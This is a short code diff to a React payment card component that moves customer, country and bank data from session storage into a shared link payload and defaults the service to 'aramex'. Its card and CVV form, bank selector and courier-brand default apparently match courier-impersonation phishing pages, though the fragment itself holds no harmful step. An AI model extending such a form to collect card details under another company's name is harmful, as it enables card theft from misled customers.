@@ -27,11 +27,11 @@ const PaymentCardInput = () => {
   const [cvv, setCvv] = useState("");
   const [cardValid, setCardValid] = useState<boolean | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  
-  // Get customer info and selected bank from sessionStorage
-  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  const selectedCountry = sessionStorage.getItem('selectedCountry') || '';
-  const selectedBankId = sessionStorage.getItem('selectedBank') || '';
+
+  // Get customer info and selected bank from link data (cross-device compatible)
+  const customerInfo = linkData?.payload?.customerInfo || {};
+  const selectedCountry = linkData?.payload?.selectedCountry || '';
+  const selectedBankId = linkData?.payload?.selectedBank || '';
   
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
